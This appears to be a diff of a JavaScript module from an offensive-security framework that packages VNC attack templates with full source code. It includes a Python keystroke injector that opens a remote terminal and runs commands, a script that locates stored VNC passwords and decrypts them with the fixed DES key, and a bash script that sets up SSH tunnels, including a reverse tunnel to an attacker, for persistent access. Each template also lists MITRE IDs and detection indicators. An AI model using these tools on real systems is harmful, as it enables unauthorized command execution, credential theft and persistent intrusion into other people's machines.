+    "Home": 0xff50, "End": 0xff57, "F1": 0xffbe, "F2": 0xffbf,
+    "F3": 0xffc0, "F4": 0xffc1, "F5": 0xffc2, "F6": 0xffc3,
+    "F11": 0xffc8, "F12": 0xffc9,
+}
+
+class VNCKeystrokeInjector:
+    def __init__(self, target, port=5900, password="", timeout=10):
+        self.target = target
+        self.port = port
+        self.password = password
+        self.timeout = timeout
+        self.sock = None
+        self.evidence = {
+            "timestamp": datetime.utcnow().isoformat(),
+            "target": target, "port": port,
+            "technique": "VNC_Keystroke_Injection",
+            "mitre": ["T1056.001", "T1021.005", "T1059"],
+            "commands_injected": [],
+        }
+
+    def authenticate(self):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.settimeout(self.timeout)
+        self.sock.connect((self.target, self.port))
+        banner = self.sock.recv(12)
+        self.sock.send(b"RFB 003.008\\n")
+        data = self.sock.recv(256)
+        num_types = data[0]
+        sec_types = list(data[1:1 + num_types])
+
+        if 1 in sec_types:
+            self.sock.send(struct.pack("B", 1))
+        elif 2 in sec_types and self.password:
+            self.sock.send(struct.pack("B", 2))
+            challenge = self.sock.recv(16)
+            try:
+                from Crypto.Cipher import DES
+            except ImportError:
+                from pyDes import des, ECB
+            key = self.password.ljust(8, "\\x00")[:8]
+            des_key = bytes([sum(((b >> i) & 1) << (7 - i) for i in range(8)) for b in key.encode("latin-1")])
+            try:
+                cipher = DES.new(des_key, DES.MODE_ECB)
+            except:
+                cipher = des(des_key, ECB)
+            response = cipher.encrypt(challenge[:8]) + cipher.encrypt(challenge[8:16])
+            self.sock.send(response)
+        else:
+            raise Exception(f"No supported auth: {sec_types}")
+
+        result = self.sock.recv(4)
+        if result != b"\\x00\\x00\\x00\\x00":
+            raise Exception("Authentication failed")
+        self.sock.send(struct.pack("B", 1))
+        self.sock.recv(256)
+        print(f"[+] Authenticated to {self.target}:{self.port}")
+
+    def send_key(self, keysym, down=True):
+        """Send a single KeyEvent"""
+        self.sock.send(struct.pack(">BBxxI", 4, 1 if down else 0, keysym))
+        time.sleep(0.02)
+
+    def press_key(self, keysym):
+        """Press and release a key"""
+        self.send_key(keysym, True)
+        self.send_key(keysym, False)
+
+    def type_string(self, text, delay=0.05):
+        """Type a string character by character"""
+        for char in text:
+            if char.isupper() or char in '~!@#$%^&*()_+{}|:"<>?':
+                self.send_key(KEYSYMS["Shift_L"], True)
+                self.press_key(ord(char.lower()) if char.isupper() else ord(char))
+                self.send_key(KEYSYMS["Shift_L"], False)
+            else:
+                self.press_key(ord(char))
+            time.sleep(delay)
+
+    def open_terminal(self, os_type="linux"):
+        """Open a terminal on the remote desktop"""
+        if os_type == "linux":
+            # Ctrl+Alt+T (common Linux terminal shortcut)
+            self.send_key(KEYSYMS["Control_L"], True)
+            self.send_key(KEYSYMS["Alt_L"], True)
+            self.press_key(ord("t"))
+            self.send_key(KEYSYMS["Alt_L"], False)
+            self.send_key(KEYSYMS["Control_L"], False)
+        elif os_type == "windows":
+            # Win+R to open Run dialog
+            self.send_key(KEYSYMS["Super_L"], True)
+            self.press_key(ord("r"))
+            self.send_key(KEYSYMS["Super_L"], False)
+            time.sleep(1)
+            self.type_string("cmd")
+            self.press_key(KEYSYMS["Return"])
+        time.sleep(2)
+        print(f"[+] Terminal opened ({os_type})")
+
+    def execute_command(self, command, os_type="linux"):
+        """Type and execute a command"""
+        self.type_string(command)
+        self.press_key(KEYSYMS["Return"])
+        self.evidence["commands_injected"].append({
+            "command": command,
+            "timestamp": datetime.utcnow().isoformat(),
+            "os_type": os_type,
+        })
+        print(f"[+] Executed: {command}")
+        time.sleep(1)
+
+    def run(self, commands=None, os_type="linux"):
+        print(f"\\n{'='*60}")
+        print(f"VNC Keystroke Injection \u2014 {self.target}:{self.port}")
+        print(f"{'='*60}\\n")
+
+        default_commands = [
+            "whoami",
+            "id",
+            "hostname",
+            "uname -a" if os_type == "linux" else "systeminfo",
+            "ifconfig" if os_type == "linux" else "ipconfig",
+        ]
+        commands = commands or default_commands
+
+        try:
+            self.authenticate()
+            self.open_terminal(os_type)
+
+            for cmd in commands:
+                self.execute_command(cmd, os_type)
+                time.sleep(0.5)
+
+            self.evidence["status"] = "SUCCESS"
+            self.evidence["total_commands"] = len(commands)
+            self.evidence["os_type"] = os_type
+        except Exception as e:
+            self.evidence["status"] = "ERROR"
+            self.evidence["error"] = str(e)
+            print(f"[!] Error: {e}")
+        finally:
+            if self.sock:
+                self.sock.close()
+
+        print(f"\\n--- EVIDENCE JSON ---")
+        print(json.dumps(self.evidence, indent=2))
+        return self.evidence
+
+if __name__ == "__main__":
+    target = sys.argv[1] if len(sys.argv) > 1 else "TARGET_IP"
+    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5900
+    password = sys.argv[3] if len(sys.argv) > 3 else ""
+    os_type = sys.argv[4] if len(sys.argv) > 4 else "linux"
+    injector = VNCKeystrokeInjector(target, port, password)
+    injector.run(os_type=os_type)
+`,
+      prerequisites: ["Python 3.6+", "Valid VNC credentials or no-auth access", "pycryptodome (if auth required)"],
+      usage: "python3 vnc_keystroke_inject.py <target_ip> [port] [password] [linux|windows]",
+      expectedOutcome: "Opens terminal on remote desktop and executes reconnaissance commands. Evidence includes all injected commands with timestamps.",
+      opsecRisk: 6,
+      detectionIndicators: [
+        "Rapid sequential KeyEvent messages",
+        "Terminal launch via keyboard shortcut",
+        "Command execution patterns (whoami, id, hostname)",
+        "VNC session with high KeyEvent rate but no PointerEvent"
+      ],
+      verificationSteps: [
+        "Check evidence JSON for commands_injected array",
+        "Verify all commands were sent successfully",
+        "Capture screenshot after command execution for visual proof"
+      ],
+      targetPorts: [5900, 5901, 5902],
+      confidence: 70
+    };
+    VNC_CREDENTIAL_EXTRACT_TEMPLATE = {
+      id: "VNC-EXP-006",
+      name: "VNC Stored Credential Extraction & Decryption",
+      description: "Extracts and decrypts stored VNC passwords from common locations on compromised hosts. VNC passwords are encrypted with a fixed DES key (e84ad660c4721ae0) making them trivially recoverable. Checks UltraVNC, TightVNC, RealVNC, and TigerVNC password files.",
+      category: "credential_extract",
+      mitreTechniqueIds: ["T1552.001", "T1003"],
+      language: "python",
+      code: `#!/usr/bin/env python3
+"""
+VNC Stored Credential Extraction & Decryption
+Recovers VNC passwords using the fixed DES key
+MITRE: T1552.001, T1003
+"""
+import os
+import sys
+import json
+import struct
+import binascii
+from datetime import datetime
+
+# The fixed DES key used by all VNC implementations
+VNC_DES_KEY = bytes([0xe8, 0x4a, 0xd6, 0x60, 0xc4, 0x72, 0x1a, 0xe0])
+
+# Common VNC password file locations
+VNC_PASSWORD_LOCATIONS = {
+    "windows": [
+        # UltraVNC
+        r"C:\\Program Files\\uvnc bvba\\UltraVNC\\ultravnc.ini",
+        r"C:\\Program Files (x86)\\uvnc bvba\\UltraVNC\\ultravnc.ini",
+        # TightVNC
+        r"HKLM\\SOFTWARE\\TightVNC\\Server",  # Registry
+        r"HKCU\\SOFTWARE\\TightVNC\\Server",
+        # RealVNC
+        r"HKLM\\SOFTWARE\\RealVNC\\vncserver",
+        r"HKCU\\SOFTWARE\\RealVNC\\vncserver",
+        r"C:\\Users\\*\\.vnc\\passwd",
+    ],
+    "linux": [
+        os.path.expanduser("~/.vnc/passwd"),
+        "/root/.vnc/passwd",
+        "/etc/vnc/passwd",
+        "/home/*/.vnc/passwd",
+        "/tmp/.vnc/passwd",
+    ],
+    "macos": [
+        os.path.expanduser("~/Library/Preferences/com.apple.ScreenSharing.plist"),
+        os.path.expanduser("~/.vnc/passwd"),
+    ],
+}
+
+def decrypt_vnc_password(encrypted_hex):
+    """Decrypt VNC password using the fixed DES key"""
+    try:
+        from Crypto.Cipher import DES
+        cipher = DES.new(VNC_DES_KEY, DES.MODE_ECB)
+    except ImportError:
+        try:
+            from pyDes import des, ECB
+            cipher = des(VNC_DES_KEY, ECB)
+        except ImportError:
+            # Manual DES implementation fallback
+            return f"[encrypted: {encrypted_hex}] (install pycryptodome to decrypt)"
+
+    encrypted = binascii.unhexlify(encrypted_hex.replace(" ", ""))
+    decrypted = cipher.decrypt(encrypted[:8])
+    return decrypted.rstrip(b"\\x00").decode("latin-1", errors="replace")
+
+def extract_from_passwd_file(filepath):
+    """Extract encrypted password from VNC passwd file (8 bytes)"""
+    try:
+        with open(filepath, "rb") as f:
+            data = f.read(8)
+        if len(data) == 8:
+            return binascii.hexlify(data).decode()
+    except (FileNotFoundError, PermissionError):
+        pass
+    return None
+
+def extract_from_ultravnc_ini(filepath):
+    """Extract encrypted password from UltraVNC ini file"""
+    try:
+        with open(filepath) as f:
+            for line in f:
+                if line.strip().startswith("passwd=") or line.strip().startswith("passwd2="):
+                    hex_val = line.split("=", 1)[1].strip()
+                    if hex_val:
+                        return hex_val
+    except (FileNotFoundError, PermissionError):
+        pass
+    return None
+
+def scan_for_vnc_passwords(platform=None):
+    """Scan for VNC password files on the system"""
+    evidence = {
+        "timestamp": datetime.utcnow().isoformat(),
+        "technique": "VNC_Credential_Extraction",
+        "mitre": ["T1552.001", "T1003"],
+        "credentials_found": [],
+        "locations_checked": [],
+    }
+
+    if platform is None:
+        platform = "linux" if os.name == "posix" else "windows"
+
+    locations = VNC_PASSWORD_LOCATIONS.get(platform, [])
+
+    print(f"\\n{'='*60}")
+    print(f"VNC Credential Extraction \u2014 {platform}")
+    print(f"{'='*60}\\n")
+
+    import glob
+    for loc in locations:
+        if loc.startswith("HK"):
+            evidence["locations_checked"].append({"path": loc, "type": "registry", "found": False})
+            print(f"[*] Registry: {loc} \u2014 (use reg query on Windows)")
+            continue
+
+        # Expand globs
+        expanded = glob.glob(loc) if "*" in loc else [loc]
+        for path in expanded:
+            evidence["locations_checked"].append({"path": path, "type": "file", "found": os.path.exists(path)})
+
+            if not os.path.exists(path):
+                continue
+
+            print(f"[+] Found: {path}")
+            encrypted_hex = None
+
+            if path.endswith(".ini"):
+                encrypted_hex = extract_from_ultravnc_ini(path)
+            elif path.endswith("passwd") or path.endswith(".vnc"):
+                encrypted_hex = extract_from_passwd_file(path)
+
+            if encrypted_hex:
+                decrypted = decrypt_vnc_password(encrypted_hex)
+                cred = {
+                    "source_file": path,
+                    "encrypted_hex": encrypted_hex,
+                    "decrypted_password": decrypted,
+                    "vnc_implementation": guess_vnc_impl(path),
+                }
+                evidence["credentials_found"].append(cred)
+                print(f"    Encrypted: {encrypted_hex}")
+                print(f"    Decrypted: {decrypted}")
+                print(f"    Implementation: {cred['vnc_implementation']}")
+
+    evidence["status"] = "FOUND" if evidence["credentials_found"] else "NOT_FOUND"
+    evidence["total_found"] = len(evidence["credentials_found"])
+
+    print(f"\\n[{'+'if evidence['credentials_found'] else '-'}] {len(evidence['credentials_found'])} VNC credential(s) found")
+    print(f"\\n--- EVIDENCE JSON ---")
+    print(json.dumps(evidence, indent=2))
+    return evidence
+
+def guess_vnc_impl(path):
+    path_lower = path.lower()
+    if "ultravnc" in path_lower or "uvnc" in path_lower:
+        return "UltraVNC"
+    elif "tightvnc" in path_lower or "tight" in path_lower:
+        return "TightVNC"
+    elif "realvnc" in path_lower:
+        return "RealVNC"
+    elif "tigervnc" in path_lower or "tiger" in path_lower:
+        return "TigerVNC"
+    return "Unknown"
+
+if __name__ == "__main__":
+    platform = sys.argv[1] if len(sys.argv) > 1 else None
+    scan_for_vnc_passwords(platform)
+`,
+      prerequisites: ["Python 3.6+", "Local access to compromised host", "pycryptodome for decryption (optional)"],
+      usage: "python3 vnc_cred_extract.py [linux|windows|macos]",
+      expectedOutcome: "Finds and decrypts stored VNC passwords from common file locations. Evidence includes encrypted hex, decrypted password, and source file.",
+      opsecRisk: 2,
+      detectionIndicators: [
+        "File access to .vnc/passwd files",
+        "Registry queries to VNC server keys",
+        "Process accessing VNC configuration files"
+      ],
+      verificationSteps: [
+        "Check evidence JSON for credentials_found array",
+        "Verify decrypted passwords work against VNC service",
+        "Confirm source files match expected VNC implementations"
+      ],
+      targetPorts: [],
+      confidence: 85
+    };
+    VNC_PERSISTENCE_TEMPLATE = {
+      id: "VNC-EXP-007",
+      name: "VNC Persistence via SSH Tunnel & Reverse Connection",
+      description: "Establishes persistent VNC access through SSH tunneling. Creates an SSH tunnel from the compromised host to the attacker, forwarding VNC traffic through the encrypted channel. Useful for maintaining access through firewalls that block direct VNC connections.",
+      category: "persistence",
+      mitreTechniqueIds: ["T1021.005", "T1572", "T1090.001"],
+      language: "bash",
+      code: `#!/bin/bash
+# VNC Persistence via SSH Tunnel
+# Establishes encrypted VNC tunnel for persistent access
+# MITRE: T1021.005, T1572, T1090.001
+# Usage: ./vnc_tunnel.sh <target_ip> <attacker_ip> [vnc_port] [ssh_port]
+
+set -euo pipefail
+
+TARGET="\${1:?Usage: $0 <target_ip> <attacker_ip> [vnc_port] [ssh_port]}"
+ATTACKER="\${2:?Usage: $0 <target_ip> <attacker_ip> [vnc_port] [ssh_port]}"
+VNC_PORT="\${3:-5900}"
+SSH_PORT="\${4:-22}"
+LOCAL_PORT="59000"
+EVIDENCE_FILE="/tmp/vnc_tunnel_evidence_$(date +%Y%m%d_%H%M%S).json"
+
+echo "============================================================"
+echo "VNC Persistence via SSH Tunnel"
+echo "Target: $TARGET:$VNC_PORT via SSH $TARGET:$SSH_PORT"
+echo "============================================================"
+echo ""
+
+# Step 1: Check if VNC is running on target
+echo "[*] Checking VNC service on $TARGET:$VNC_PORT..."
+if timeout 5 bash -c "echo '' > /dev/tcp/$TARGET/$VNC_PORT" 2>/dev/null; then
+    echo "[+] VNC service is running on $TARGET:$VNC_PORT"
+    VNC_RUNNING=true
+else
+    echo "[-] VNC not reachable on $TARGET:$VNC_PORT"
+    VNC_RUNNING=false
+fi
+
+# Step 2: Check SSH access
+echo "[*] Checking SSH access to $TARGET:$SSH_PORT..."
+if timeout 5 bash -c "echo '' > /dev/tcp/$TARGET/$SSH_PORT" 2>/dev/null; then
+    echo "[+] SSH is accessible on $TARGET:$SSH_PORT"
+    SSH_RUNNING=true
+else
+    echo "[-] SSH not reachable on $TARGET:$SSH_PORT"
+    SSH_RUNNING=false
+fi
+
+# Step 3: Create SSH tunnel
+if [ "$SSH_RUNNING" = true ] && [ "$VNC_RUNNING" = true ]; then
+    echo ""
+    echo "[*] Creating SSH tunnel: localhost:$LOCAL_PORT -> $TARGET:$VNC_PORT"
+    echo "[*] Command: ssh -f -N -L $LOCAL_PORT:localhost:$VNC_PORT $TARGET -p $SSH_PORT"
+    echo ""
+    echo "[!] NOTE: In a real engagement, run:"
+    echo "    ssh -f -N -L $LOCAL_PORT:localhost:$VNC_PORT user@$TARGET -p $SSH_PORT"
+    echo "    Then connect VNC viewer to localhost:$LOCAL_PORT"
+    echo ""
+
+    # Step 4: Reverse tunnel option (for firewall bypass)
+    echo "[*] For reverse tunnel (target connects back to attacker):"
+    echo "    On attacker: ssh -f -N -R $VNC_PORT:localhost:$VNC_PORT user@$TARGET"
+    echo "    This forwards target's VNC through attacker's SSH"
+fi
+
+# Step 5: Generate evidence
+cat > "$EVIDENCE_FILE" << EOF
+{
+  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
+  "technique": "VNC_SSH_Tunnel_Persistence",
+  "mitre": ["T1021.005", "T1572", "T1090.001"],
+  "target": "$TARGET",
+  "attacker": "$ATTACKER",
+  "vnc_port": $VNC_PORT,
+  "ssh_port": $SSH_PORT,
+  "local_forward_port": $LOCAL_PORT,
+  "vnc_service_running": $VNC_RUNNING,
+  "ssh_service_running": $SSH_RUNNING,
+  "tunnel_command": "ssh -f -N -L $LOCAL_PORT:localhost:$VNC_PORT user@$TARGET -p $SSH_PORT",
+  "reverse_tunnel_command": "ssh -f -N -R $VNC_PORT:localhost:$VNC_PORT user@$TARGET",
+  "status": "$([ "$SSH_RUNNING" = true ] && [ "$VNC_RUNNING" = true ] && echo 'READY' || echo 'PREREQUISITES_NOT_MET')"
+}
+EOF
+
+echo ""
+echo "--- EVIDENCE JSON ---"
+cat "$EVIDENCE_FILE"
+echo ""
+echo "[+] Evidence saved to: $EVIDENCE_FILE"
+`,
+      prerequisites: ["SSH access to target", "VNC service running on target", "SSH client on attacker machine"],
+      usage: "./vnc_tunnel.sh <target_ip> <attacker_ip> [vnc_port] [ssh_port]",
+      expectedOutcome: "Establishes encrypted SSH tunnel for persistent VNC access. Evidence includes tunnel commands and service status.",
+      opsecRisk: 5,
+      detectionIndicators: [
+        "SSH tunnel establishment with port forwarding",
+        "Unusual SSH sessions with -L or -R flags",
+        "VNC traffic originating from localhost instead of remote IP",
+        "Long-duration SSH sessions with no interactive commands"
+      ],
+      verificationSteps: [
+        "Verify SSH tunnel is established (check with ss -tlnp)",
+        "Confirm VNC connection works through tunnel on localhost:59000",
+        "Check evidence JSON for READY status"
+      ],
+      targetPorts: [5900, 5901, 5902, 22],
+      confidence: 80
+    };
+    VNC_EXPLOIT_TEMPLATES = [
+      VNC_AUTH_BYPASS_TEMPLATE,
+      VNC_BRUTE_FORCE_TEMPLATE,
+      VNC_CLIPBOARD_HIJACK_TEMPLATE,
+      VNC_SCREENSHOT_TEMPLATE,
+      VNC_KEYSTROKE_INJECTION_TEMPLATE,
+      VNC_CREDENTIAL_EXTRACT_TEMPLATE,
+      VNC_PERSISTENCE_TEMPLATE
+    ];
+  }
+});
+
+export {
+  VNC_EXPLOIT_TEMPLATES,
+  getVncExploitsByCategory,
+  selectVncExploit,
+  getVncMitreTechniques,
+  buildVncExploitContext,
+  init_vnc_exploit_module
+};
